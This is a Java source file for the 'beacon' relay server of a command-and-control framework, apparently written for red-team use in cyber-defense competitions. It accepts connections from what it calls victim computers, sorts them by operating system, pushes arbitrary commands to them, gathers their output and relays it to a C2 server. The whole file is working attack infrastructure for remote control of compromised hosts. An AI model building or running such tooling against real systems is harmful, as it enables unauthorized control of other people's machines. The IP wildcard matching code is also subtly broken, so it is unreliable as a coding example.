package Servers.Beacon;

import java.util.Scanner;
import Servers.Duplexer;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;

public class BeaconServer implements Runnable{
    // Dictionaries to Map IP's to Client responses
    private HashMap<String,ArrayList<String>> windowsClientResponses;
    private HashMap<String,ArrayList<String>> linuxClientResponses;

    // Dictionary to Map IP's to Objects that handle them
    private HashMap<String,BeaconClientHandler> windowsClientObjects;
    private HashMap<String,BeaconClientHandler> linuxClientObjects;
    
    // Pointer to the Thread responsible for interacting with the C2 Server
    private BeaconC2Handler C2Handler;

    // Socket that is listentning for connections from clients (victim computers)
    private ServerSocket serverSocket;

    // Boolean to determine if server should remain running
    private boolean sentinel = true;

    // Text colors for Hard visuals
    private String GREEN = "\u001B[32m";
    private String RESET = "\u001B[37m";
    private String RED = "\u001B[31m";

    /**
     * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
     * back to the C2 Server.
     * 
     * @param C2ServerIPAddress IP Address of the C2 Server
     * @param passwordDigest SHA-256 Digest of the Password entered by the user setting up this Beacon
     * @throws IOException
     */
    public BeaconServer(String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.windowsClientResponses = new HashMap<>();
        this.linuxClientResponses = new HashMap<>();
        this.windowsClientObjects = new HashMap<>();
        this.linuxClientObjects = new HashMap<>();

        this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
        this.serverSocket = new ServerSocket(80);
    }

    /**
     * This function is used to shut down the Beacon Server. 
     * The Beacon server will distribute this message accordingly, to ensure that all
     * connections are shut down gracefully
     * 
     * @param reason
     * @throws IOException
     */
    protected void quit(String reason) throws IOException{
        synchronized(windowsClientObjects){
            for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
                clientHandler.quit(reason);
            }
        }
        synchronized(linuxClientObjects){
            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                clientHandler.quit(reason);
            }
        }
        serverSocket.close();
        System.out.println("Beacon Server is shutting down. Reason: " + reason);
    }

    /**
     * This Function takes an IP address, with a wildcard character, and returns all
     * Matches for that IP Address. 
     * 
     * Example
     * Client IP Address = {192.168.1.1, 192.168.4.5, 10.1.10.1, 10.2.10.1}
     * 
     * Parameter 10.x.10.1
     * Return Value {10.1.10.1, 10.2.10.1}
     * 
     * Parameter 192.168.1.x
     * Return Value {192.168.1.1}
     * 
     * Parameter 192.168.x.x
     * Return Value {192.168.1.1, 192.168.4.5}
     * 
     * Parameter 172.16.x.15
     * Return Value {}
     * 
     * @param IPAddress IP Address to Match
     * @return All Clients with a matching IP Address
     */
    private ArrayList<String> getIPMatches(String IPAddress){
        ArrayList<String> matches = new ArrayList<>();
        String octets[] = IPAddress.split(".");
        for(String ip : windowsClientObjects.keySet()){
            String clientOctets[] = ip.split(".");
            if((octets[0].equals(clientOctets[0]) || octets[0].equals('x')) && (octets[1].equals(clientOctets[1]) || octets[1].equals('x')) && (octets[2].equals(clientOctets[2]) || octets[2].equals('x')) && (octets[3].equals(clientOctets[3]) || octets[3].equals('x'))){
                matches.add(ip);
            }
        }
        for(String ip : linuxClientObjects.keySet()){
            String clientOctets[] = ip.split(".");
            if((octets[0].equals(clientOctets[0]) || octets[0].equals('x')) && (octets[1].equals(clientOctets[1]) || octets[1].equals('x')) && (octets[2].equals(clientOctets[2]) || octets[2].equals('x')) && (octets[3].equals(clientOctets[3]) || octets[3].equals('x'))){
                matches.add(ip);
            }
        }
        return matches;
    }

    /**
     * Distribute commands from the Beacon C2 Handler, to all of the different Beacon Client Handlers.
     * 
     * @param scope - What clients should receive the command
     * @param command - what Command should be run
     */
    protected void distributeCommands(String scope, String command){
        if(scope.equals("Windows")){
            for(BeaconClientHandler clientHandler : windowsClientObjects.values()) {
                clientHandler.sendToClient(command);
            }
        } else if(scope.equals("Linux")){
            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                clientHandler.sendToClient(command);
            }
        } else {
            if(windowsClientObjects.keySet().contains(scope)){
                windowsClientObjects.get(scope).sendToClient(command);
            } else if(linuxClientObjects.keySet().contains(scope)){
                linuxClientObjects.get(scope).sendToClient(command);
            }
        }
    }

    /**
     * Add Responses from commands run on the C2 Victims to an ArrayList containing all of their responses
     * 
     * @param IPAddress the IP Address of the Client that the response came from
     * @param Response The Response sent from the client
     */
    protected void addDataToResponsesDictionaries(String IPAddress, String Response){
        synchronized(windowsClientResponses){
            synchronized(linuxClientResponses){
                if(windowsClientResponses.keySet().contains(IPAddress)){
                    windowsClientResponses.get(IPAddress).add(Response);
                } else {
                    linuxClientResponses.get(IPAddress).add(Response);
                }
            }
        }
    }

    /**
     * Get all responses to C2 Commands from an individual client
     * 
     * @param IPAddress IP Address of the client that the C2 requests the responses to.
     * @return ArrayList of all of the responses from the desired client
     */
    protected ArrayList<String> getSingleClientResponses(String IPAddress){
        synchronized(windowsClientResponses){
            synchronized(linuxClientResponses){
                if(windowsClientResponses.keySet().contains(IPAddress)){
                    return windowsClientResponses.get(IPAddress);
                } else {
                    return linuxClientResponses.get(IPAddress);
                }
            }
        }
    }

    /**
     * Get Responses to C2 Commands from All clients of a particular Operating System
     * 
     * @param OS "Windows" or "Linux"
     * @return HashMap of all Responses. Keys are the IP Addresses that the Responses come from,
     * and the Value is an ArrayList of all of the responses to commands sent by the C2
     */
    protected HashMap<String, ArrayList<String>> getMultipleClientResponses(String OS){
        if(OS.equals("Windows")){
            synchronized(windowsClientResponses){
                return windowsClientResponses;
            }
        }else{
            synchronized(linuxClientResponses){
                return linuxClientResponses;
            }
        }
    }

    /**
     * This function will provide the Status (Can the C2 Server still run commands on the victims) 
     * of Clients that this Beacon Server is responsible for based on the Scope Parameter
     * 
     * @param Scope Either "All", "Windows", "Linux", or the IP Address (x.x.x.x) of the Computer of whose status is desired
     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
     * communicate with the Beacon, False if the client cannot communicate with the Beacon
     */
    protected String getClientStatus(){
        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
        // True if the client is still active, false if the client is no longer active.
        HashMap<String, Boolean> clientStatus = new HashMap<>();

        // Check all Windows Boxes
        distributeCommands("Windows", "Test-Path C:\\Windows");
        for (String ip : windowsClientResponses.keySet()){
            if (windowsClientResponses.get(ip).size() != 0){
                if ((windowsClientResponses.get(ip).contains("True")) && !windowsClientResponses.get(ip).contains("DISCONNECTED")){
                    // If responses contains the string we just send a command to get, then remove it, and give it true
                    ArrayList<String> tempList = windowsClientResponses.get(ip);
                    tempList.remove("True");
                    windowsClientResponses.put(ip, tempList);
                    clientStatus.put(ip, true);
                } else {
                    clientStatus.put(ip, false);
                }
            }   
        }

        distributeCommands("Linux", "whoami");
        // Check all Linux Boxes
        for (String ip : linuxClientResponses.keySet()){
            if (linuxClientResponses.get(ip).size() != 0){
                if (linuxClientResponses.get(ip).contains("root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
                    // If responses contains the string we just send a command to get, then remove it, and give it true
                    ArrayList<String> tempList = linuxClientResponses.get(ip);
                    tempList.remove("root");
                    linuxClientResponses.put(ip, tempList);
                    clientStatus.put(ip, true);
                } else {
                    clientStatus.put(ip, false);
                }
            }   
        }
        

        // Creating fire visually pleasing table of client status
        String table = " ________________________________________________\n";
        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
        table += "|______________________|_________________________|\n";
        for (String ip : clientStatus.keySet()) {
            String status;
            boolean status_bool;
            if (clientStatus.get(ip)) {
                status = GREEN + "CONNECTED :D" + RESET;
                status_bool = false;
            } else {
                status = RED + "DISCONNECTED D:" + RESET;
                status_bool = true;
            }
            // If the status is disconnected
            if (status_bool){
                table += String.format("| %-20s | %-33s |\n", ip, status);
            }
            // If the status is connected
            else {
                table += String.format("| %-20s | %-33s |\n", ip, status);
            }
        }
        table += "|______________________|_________________________|\n";
        return table;
    }

    /**
     * This Function is used by the client handler to inform the C2 Server that it has lost a client
     * @param data
     */
    protected void sendDataToC2Server(String data){
        C2Handler.sendDataToC2Server(data);
    }

    protected void stopServer(){
        sentinel = false; 
    }

    @Override
    public void run(){
        // Start the thread that interacts with the C2 Server
        Thread C2HandlerThread = new Thread(C2Handler);
        C2HandlerThread.start();
        // Always listening for clients
        while(sentinel){
            try{
                // Accept new client
                Socket socket = serverSocket.accept();
                Duplexer duplexer = new Duplexer(socket);

                // First message is from the client is the Operating System, Windows or Linux
                String OSMessage = duplexer.receive();
                System.out.println("Inital Message: " + OSMessage);

                // Second Message is from the client to the server, the IP address of the client.
                // The Client sends it's own IP Address, so that all of the IP addresses are not viewed as NAT'd ip addresses
                // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
                // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
                String IPAddress = duplexer.receive();
                System.out.println("IP Address: " + IPAddress);
                
                if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                    // Send message to C2 announcing that a new client has been obtained
                    C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);

                    // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
                    BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage);
                    Thread clientHandlerThread = new Thread(clientHandler);
                    clientHandlerThread.start();

                    // Add to client lists
                    if(OSMessage.equals("Windows")){
                        windowsClientObjects.put(IPAddress,clientHandler);
                        windowsClientResponses.put(IPAddress, new ArrayList<String>());
                    }else if(OSMessage.equals("Linux")){
                        linuxClientObjects.put(IPAddress,clientHandler);
                        linuxClientResponses.put(IPAddress, new ArrayList<String>());
                    }
                }
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args){
        // Have the user enter in the IP Address to connect to
        Scanner userScanner = new Scanner(System.in);
        System.out.print("Enter C2 Server IP Address: ");
        String C2ServerIPAddress = userScanner.next();
        // Have the user enter in the password
        System.out.print("Enter Password: ");
        String password = userScanner.next();
        // Hash the Password
        String passwordDigest = "";
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){}
        
        try{
            BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress, passwordDigest);
            Thread beaconServerThread = new Thread(beaconServer);
            beaconServerThread.start();
        } catch(IOException e){
            e.printStackTrace();
        }
        
        userScanner.close();
    }
}
